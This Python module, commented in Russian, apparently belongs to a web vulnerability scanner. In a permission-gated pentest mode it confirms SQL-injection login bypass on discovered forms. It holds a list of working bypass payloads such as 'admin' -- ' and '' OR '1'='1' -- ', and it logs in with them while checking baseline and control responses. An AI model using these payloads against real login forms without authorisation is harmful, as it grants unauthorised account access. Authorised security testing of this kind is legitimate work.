"""Подтверждение обхода авторизации через SQL-инъекцию в форме входа — режим --pentest.

Типичная уязвимая реализация склеивает запрос вида
``SELECT * FROM users WHERE login='<логин>' AND password='<пароль>'``.
Payload ``admin' -- `` обрывает условие по паролю: сервер выполняет
«войди как admin, пароль не важен» и выдаёт настоящую, рабочую сессию —
это не предположение по тексту ошибки, а прямое наблюдаемое последствие
эксплуатации.

Проверка не портит и не читает ничьи данные: она один раз входит под именем
учётной записи из payload'а (своей собственной сессией сканера), в точности
как обычный пользователь нажал бы «войти», и сразу завершает проверку. Это
такое же «совершение» уязвимости, как обращение к открытой Groovy-консоли
Jenkins в ``cve_confirm.py``: без него нельзя отличить настоящий обход
авторизации от страницы, которая после ЛЮБОЙ попытки входа отвечает одинаково.
Поэтому — только при явном подтверждении полномочий оператором (``--pentest``
и ``--i-have-permission-to-attack``), как и остальные находки с
``exploited=True``.

Ограничение запросов: не более ``MAX_FORMS`` форм, на каждую — пробный
(контрольный) вход с заведомо несуществующими данными, затем до
``len(BYPASS_PAYLOADS)`` попыток обхода и один контрольный payload с заведомо
ложным условием. Как только обход подтверждён, проверка формы прекращается.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional, Sequence, Tuple
from urllib.parse import urlparse

from ..http_client import HttpClient
from ..models import CONFIRMED, HIGH, VULN, Finding, Form, Page
from ..utils import describe_request, truncate

__all__ = ["run_auth_bypass_checks"]

MARKER = "BAUMAN_TEST_92841"
BASELINE_USER = f"{MARKER}_no_such_user"
BASELINE_PASSWORD = f"{MARKER}_wrong_password"
PROBE_PASSWORD = f"{MARKER}_any_password"

# Классические payload'ы обхода проверки пароля. Второй элемент пары —
# заведомо ложное условие с той же синтаксической формой: если «обходит» и
# оно, причина не в SQL-инъекции (например, форма принимает любые данные).
BYPASS_PAYLOADS: Tuple[str, ...] = (
    "admin' -- ",
    "admin'-- ",
    "' OR '1'='1' -- ",
    '" OR "1"="1" -- ',
    "admin\" -- ",
)
CONTROL_PAYLOAD = "' AND '1'='2' -- "

MAX_FORMS = 5
PEEK = 1200

# Признаки неудачного входа: форма возвращает такую фразу рядом с полем пароля.
FAILURE_HINTS = (
    "неверн", "incorrect", "invalid", "wrong password", "wrong login",
    "failed", "не найден", "отказано", "denied",
)


@dataclass
class _LoginForm:
    form: Form
    user_field: str
    password_field: str


def run_auth_bypass_checks(client: HttpClient, pages: Sequence[Page],
                           reserve: int = 0) -> List[Finding]:
    """Ищет формы входа и проверяет классические SQLi-payload'ы обхода пароля."""
    findings: List[Finding] = []
    forms = _login_forms(pages)[:MAX_FORMS]
    for login_form in forms:
        if not client.can_request(reserve):
            break
        found = _probe_form(client, login_form, reserve)
        if found:
            findings.append(found)
    return findings


def _login_forms(pages: Sequence[Page]) -> List[_LoginForm]:
    out: List[_LoginForm] = []
    seen = set()
    for page in pages:
        for form in page.forms:
            if form.method != "POST":
                continue
            if urlparse(form.action).scheme not in ("http", "https"):
                continue
            password_fields = [f.name for f in form.fields if f.field_type == "password"]
            text_fields = [f.name for f in form.fields
                          if f.field_type in ("text", "email") and f.name]
            if len(password_fields) != 1 or not text_fields:
                continue
            key = (form.action, password_fields[0])
            if key in seen:
                continue
            seen.add(key)
            # Поле логина — первое текстовое поле формы (обычные формы входа
            # содержат ровно одно такое поле рядом с паролем).
            out.append(_LoginForm(form=form, user_field=text_fields[0],
                                  password_field=password_fields[0]))
    return out


def _attempt(client: HttpClient, login_form: _LoginForm, user_value: str,
            password_value: str, reserve: int):
    data = dict(login_form.form.data())
    data[login_form.user_field] = user_value
    data[login_form.password_field] = password_value
    return client.request(login_form.form.method, login_form.form.action, data=data,
                          allow_redirects=False, reserve=reserve), data


def _signature(response) -> Tuple[int, str, bool]:
    """Статус, адрес редиректа (если есть) и признак текста «неверный логин/пароль»."""
    location = response.headers.get("Location", "") if response.status_code in (
        301, 302, 303, 307, 308) else ""
    body = _text(response).lower()
    has_failure_text = any(hint in body for hint in FAILURE_HINTS)
    return response.status_code, location, has_failure_text


def _looks_authenticated(baseline_sig, candidate_sig, candidate_response) -> bool:
    """Ответ на payload выглядит как успешный вход, а не как обычный отказ."""
    baseline_status, baseline_location, baseline_failed = baseline_sig
    status, location, failed = candidate_sig
    still_login_page = bool(location) and ("login" in location.lower()
                                           or "вход" in location.lower())
    # 1) Был обычный отказ (200 со страницей формы) — стал редирект куда-то,
    #    кроме страницы входа: сервер принял решение «вход выполнен».
    redirected_away = (status in (301, 302, 303, 307, 308) and not still_login_page
                       and baseline_status not in (301, 302, 303, 307, 308))
    # 2) Пропала фраза «неверный логин/пароль», которая была в обычном отказе,
    #    и в ответе больше нет самой формы с паролем — остаться на той же
    #    отрисованной форме с тем же текстом ошибки означало бы, что ничего
    #    не изменилось.
    error_vanished = baseline_failed and not failed and not still_login_page
    if not (redirected_away or error_vanished):
        return False
    # Новая сессия должна быть выдана — иначе это просто другая страница
    # с тем же анонимным состоянием (например, форма отправляется на /, где
    # текст ошибки по совпадению не встречается).
    return "set-cookie" in {k.lower() for k in candidate_response.headers.keys()}


def _probe_form(client: HttpClient, login_form: _LoginForm, reserve: int) -> Optional[Finding]:
    baseline, baseline_data = _attempt(client, login_form, BASELINE_USER, BASELINE_PASSWORD,
                                       reserve)
    if baseline is None:
        return None
    baseline_sig = _signature(baseline)

    for payload in BYPASS_PAYLOADS:
        if not client.can_request(reserve):
            return None
        response, data = _attempt(client, login_form, payload, PROBE_PASSWORD, reserve)
        if response is None:
            continue
        candidate_sig = _signature(response)
        if not _looks_authenticated(baseline_sig, candidate_sig, response):
            continue

        # Контроль: синтаксически похожий, но логически ложный payload не
        # должен проходить. Если проходит и он — обход не связан с SQL.
        if not client.can_request(reserve):
            return None
        control, control_data = _attempt(client, login_form, CONTROL_PAYLOAD, PROBE_PASSWORD,
                                         reserve)
        if control is not None and _looks_authenticated(
            baseline_sig, _signature(control), control
        ):
            return None

        return Finding(
            url=login_form.form.page_url,
            title=f"Подтверждён обход авторизации через SQL-инъекцию: {login_form.form.describe()}",
            kind="sqli_auth_bypass",
            category=VULN,
            severity=HIGH,
            recommendation="Используйте параметризованные запросы для проверки логина и "
                           "пароля, никогда не собирайте SQL-условие конкатенацией строк. "
                           "Храните пароли только в виде хешей (bcrypt/argon2) и сверяйте их "
                           "после выборки пользователя по логину — так инъекция не сможет "
                           "обойти саму проверку пароля.",
            request=describe_request(login_form.form.method, login_form.form.action, data),
            evidence=truncate(
                f"Контрольный вход (неверные логин/пароль): {_describe_signature(baseline_sig)}\n"
                f"Вход с payload'ом «{login_form.user_field}={payload}»: "
                f"{_describe_signature(candidate_sig)}\n"
                f"Контрольный payload с ложным условием («{CONTROL_PAYLOAD}») обход не даёт.\n"
                "Выполнен только вход — пароль не менялся, данные других пользователей не "
                "читались и не изменялись.",
                1000,
            ),
            confidence=CONFIRMED,
            exploited=True,
        )
    return None


def _describe_signature(sig: Tuple[int, str, bool]) -> str:
    status, location, failed = sig
    parts = [f"HTTP/{status}"]
    if location:
        parts.append(f"Location: {location}")
    parts.append("есть фраза об ошибке входа" if failed else "фразы об ошибке входа нет")
    return ", ".join(parts)


def _text(response) -> str:
    try:
        return (response.text or "")[:PEEK]
    except Exception:
        return ""
